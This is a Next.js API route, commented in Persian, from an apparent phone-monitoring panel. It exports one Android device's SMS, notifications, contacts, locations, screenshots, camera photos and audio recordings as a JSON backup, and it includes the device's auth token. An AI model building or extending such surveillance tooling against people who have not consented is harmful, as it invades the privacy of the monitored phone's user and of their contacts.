import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import { isAdminRequest, unauthorizedResponse } from "@/lib/auth";

/**
 * بکاپ‌گیری کامل از داده‌های یک دستگاه متصل.
 *
 * تمام داده‌های مرتبط با دستگاه شامل برنامه‌ها، مصرف، رویدادها، پیامک‌ها،
 * اعلان‌ها، مخاطبین، موقعیت‌ها، عکس‌های گالری (همراه thumbnail) را در قالب
 * یک فایل JSON برای دانلود آماده می‌کند.
 *
 * با پارامتر ?includeMedia=1 یا ?includeMedia=true علاوه بر موارد بالا،
 * عکس‌های دوربین (CapturePhoto)، اسکرین‌شات‌ها (ScreenCapture) و قطعات
 * صوتی (AudioClip) به‌صورت base64 در فایل بکاپ قرار می‌گیرند. این موارد
 * ممکن است حجم بالایی داشته باشند، لذا به‌صورت پیش‌فرض شامل نمی‌شوند.
 *
 * ساختار فایل خروجی:
 *   {
 *     version: "1",
 *     exportedAt: ISO,
 *     includeMedia: boolean,
 *     device: { ...اطلاعات دستگاه (بدون id و token) },
 *     apps: [...],
 *     usage: [...],
 *     events: [...],
 *     sms: [...],
 *     notifications: [...],
 *     contacts: [...],
 *     pings: [...],
 *     photos: [{ ..., thumbBase64? }],
 *     captures: [{ ..., jpegBase64? }]?,   // فقط با includeMedia
 *     screens: [{ ..., jpegBase64? }]?,    // فقط با includeMedia
 *     audioClips: [{ ..., audioBase64? }]? // فقط با includeMedia
 *   }
 *
 * فایل خروجی به‌صورت attachment دانلود می‌شود تا مرورگر آن را ذخیره کند.
 */
export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  if (!(await isAdminRequest())) return unauthorizedResponse();
  const { id } = await params;

  const url = new URL(req.url);
  const mediaParam = url.searchParams.get("includeMedia");
  const includeMedia = mediaParam === "1" || mediaParam === "true";

  const device = await db.device.findUnique({ where: { id } });
  if (!device) {
    return NextResponse.json({ error: "دستگاه پیدا نشد" }, { status: 404 });
  }

  // بارگذاری همه‌ی داده‌های مرتبط با دستگاه
  const [
    apps,
    usage,
    events,
    sms,
    notifications,
    contacts,
    pings,
    photos,
    captures,
    screens,
    audioClips,
  ] = await Promise.all([
    db.deviceApp.findMany({
      where: { deviceId: id },
      select: {
        packageName: true,
        label: true,
        controlled: true,
        updatedAt: true,
      },
    }),
    db.usageEntry.findMany({
      where: { deviceId: id },
      select: { day: true, packageName: true, minutes: true },
    }),
    db.eventLog.findMany({
      where: { deviceId: id },
      select: { type: true, message: true, createdAt: true },
    }),
    db.smsMessage.findMany({
      where: { deviceId: id },
      select: {
        smsId: true,
        address: true,
        body: true,
        type: true,
        at: true,
      },
    }),
    db.notificationItem.findMany({
      where: { deviceId: id },
      select: {
        localId: true,
        packageName: true,
        title: true,
        text: true,
        at: true,
      },
    }),
    db.contactEntry.findMany({
      where: { deviceId: id },
      select: { name: true, phones: true },
    }),
    db.locationPing.findMany({
      where: { deviceId: id },
      select: {
        lat: true,
        lng: true,
        accuracy: true,
        provider: true,
        at: true,
      },
    }),
    db.photoEntry.findMany({
      where: { deviceId: id },
      select: {
        mediaId: true,
        takenAt: true,
        size: true,
        bucket: true,
        thumb: includeMedia,
      },
    }),
    includeMedia
      ? db.capturePhoto.findMany({
          where: { deviceId: id },
          select: { jpeg: true, takenAt: true, createdAt: true },
        })
      : Promise.resolve([]),
    includeMedia
      ? db.screenCapture.findMany({
          where: { deviceId: id },
          select: { jpeg: true, takenAt: true, createdAt: true },
        })
      : Promise.resolve([]),
    includeMedia
      ? db.audioClip.findMany({
          where: { deviceId: id },
          select: {
            audio: true,
            mimeType: true,
            durationSec: true,
            recordedAt: true,
            createdAt: true,
          },
        })
      : Promise.resolve([]),
  ]);

  // توکن دستگاه در بکاپ ذخیره می‌شود تا در صورت بازیابی روی پنلی با همان
  // URL، گوشی بدون نیاز به جفت‌سازی دوباره به‌طور خودکار به همان دستگاه
  // بازیابی‌شده وصل بماند. این فایل فقط برای ادمین قابل دانلود است و
  // مسئولیت نگهداری آن با اوست.
  const backup = {
    version: "1",
    exportedAt: new Date().toISOString(),
    includeMedia,
    device: {
      name: device.name,
      model: device.model,
      androidVersion: device.androidVersion,
      appVersion: device.appVersion,
      battery: device.battery,
      lastSeenAt: device.lastSeenAt,
      lastSyncAt: device.lastSyncAt,
      createdAt: device.createdAt,
      screenMonitorEnabled: device.screenMonitorEnabled,
      screenMonitorStartedAt: device.screenMonitorStartedAt,
      audioMonitorEnabled: device.audioMonitorEnabled,
      audioMonitorStartedAt: device.audioMonitorStartedAt,
      accessibilityEnabled: device.accessibilityEnabled,
      locLat: device.locLat,
      locLng: device.locLng,
      locAccuracy: device.locAccuracy,
      locProvider: device.locProvider,
      locAt: device.locAt,
      // توکن دستگاه — برای اتصال خودکار گوشی به پنل بازیابی‌شده (اگر URL یکی باشد)
      token: device.token,
    },
    apps: apps.map((a) => ({
      packageName: a.packageName,
      label: a.label,
      controlled: a.controlled,
      updatedAt: a.updatedAt,
    })),
    usage: usage.map((u) => ({
      day: u.day,
      packageName: u.packageName,
      minutes: u.minutes,
    })),
    events: events.map((e) => ({
      type: e.type,
      message: e.message,
      createdAt: e.createdAt,
    })),
    sms: sms.map((s) => ({
      smsId: s.smsId,
      address: s.address,
      body: s.body,
      type: s.type,
      at: s.at,
    })),
    notifications: notifications.map((n) => ({
      localId: n.localId,
      packageName: n.packageName,
      title: n.title,
      text: n.text,
      at: n.at,
    })),
    contacts: contacts.map((c) => ({
      name: c.name,
      phones: c.phones,
    })),
    pings: pings.map((p) => ({
      lat: p.lat,
      lng: p.lng,
      accuracy: p.accuracy,
      provider: p.provider,
      at: p.at,
    })),
    photos: photos.map((p) => ({
      mediaId: p.mediaId,
      takenAt: p.takenAt,
      size: p.size,
      bucket: p.bucket,
      // thumbnail به‌صورت base64 — فقط زمانی که includeMedia=true باشد.
      // thumbnailها معمولاً کوچک هستند (۲-۱۰ کیلوبایت) پس شامل شدنشان مشکلی ایجاد نمی‌کند.
      thumbBase64:
        includeMedia && p.thumb
          ? Buffer.from(p.thumb as Uint8Array).toString("base64")
          : undefined,
    })),
    captures: includeMedia
      ? captures.map((c) => ({
          jpegBase64: Buffer.from(c.jpeg as Uint8Array).toString("base64"),
          takenAt: c.takenAt,
          createdAt: c.createdAt,
        }))
      : undefined,
    screens: includeMedia
      ? screens.map((s) => ({
          jpegBase64: Buffer.from(s.jpeg as Uint8Array).toString("base64"),
          takenAt: s.takenAt,
          createdAt: s.createdAt,
        }))
      : undefined,
    audioClips: includeMedia
      ? audioClips.map((a) => ({
          audioBase64: Buffer.from(a.audio as Uint8Array).toString("base64"),
          mimeType: a.mimeType,
          durationSec: a.durationSec,
          recordedAt: a.recordedAt,
          createdAt: a.createdAt,
        }))
      : undefined,
  };

  // نام فایل خروجی: نگهبان-بکاپ-<نام دستگاه>-<تاریخ>.json
  // نام دستگاه برای استفاده در filename* (UTF-8) و یک نسخه‌ی ASCII برای filename
  const dateStr = new Date().toISOString().slice(0, 10);
  const asciiName = "negahban-backup";
  const faName = `نگهبان-بکاپ-${device.name || "device"}-${dateStr}.json`;

  const json = JSON.stringify(backup);
  const body = new Uint8Array(Buffer.from(json, "utf-8"));

  return new NextResponse(body, {
    headers: {
      "content-type": "application/json; charset=utf-8",
      "content-disposition": `attachment; filename="${asciiName}.json"; filename*=UTF-8''${encodeURIComponent(faName)}`,
      "content-length": String(body.byteLength),
      "cache-control": "no-store",
    },
  });
}
